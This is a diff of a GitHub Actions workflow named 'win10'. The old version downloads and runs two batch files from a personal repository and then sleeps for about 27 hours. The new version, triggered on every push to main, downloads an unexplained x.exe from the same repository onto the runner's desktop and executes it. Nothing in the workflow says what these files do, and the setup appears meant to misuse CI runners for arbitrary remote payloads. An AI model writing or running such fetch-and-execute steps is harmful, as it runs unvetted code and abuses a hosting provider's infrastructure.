@@ -1,26 +1,22 @@
 name: win10
 
 on:
-  workflow_dispatch:
+  push:
+    branches:
+      - main
 
 jobs:
-  build:
-    name: Start Building...
+  run-exe:
     runs-on: windows-latest
-    timeout-minutes: 360
-    
+
     steps:
-      - name: Downloading & Installing Essentials
-        run: |
-          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/uv/Downloads.bat" -OutFile "Downloads.bat"
-          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/Any/Any.bat" -OutFile "Any.bat"
+    - name: Checkout repository
+      uses: actions/checkout@v3
 
-                  
-      - name: Any
-        run: cmd /c Any.bat
+    - name: Download x.exe
+      run: |
+        powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/w10/x.exe' -OutFile 'C:\Users\runneradmin\Desktop\x.exe'"
 
-      - name: Time Counter
-        run: cmd /c Downloads.bat
-        
-      - name: Time Counter
-        run: sleep 99999
+    - name: Execute x.exe
+      run: |
+        powershell -Command "Start-Process -FilePath 'C:\Users\runneradmin\Desktop\x.exe' -NoNewWindow -Wait"
